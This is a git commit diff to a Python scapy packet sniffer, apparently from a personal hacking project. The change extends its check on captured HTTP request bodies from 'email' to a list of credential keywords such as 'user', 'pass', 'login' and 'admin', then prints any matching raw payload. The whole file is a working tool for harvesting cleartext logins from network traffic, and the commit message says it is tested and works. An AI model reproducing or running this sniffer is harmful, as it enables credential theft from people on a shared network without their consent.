8f75bddb1a93ba4d8b672872a4ba14af94dc2fca
Vhackenstance <hackenstance@proton.me>
2026-06-02 05:41:47 -0500

    search load from list, break, tested works http

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -3,12 +3,18 @@
 import scapy.all as scapy
 from scapy.layers import http
 
+keywords = ["email", "user", "admin", "name", "pass", "login", "name", "word"]
+# might be worth searching for "@"
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load
-            if "email" in load:
-                print(load)
+            for keyword in keywords:
+                if keyword in load:
+                    print("[+] Keyword Found")
+                    print(load)
+                    break
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
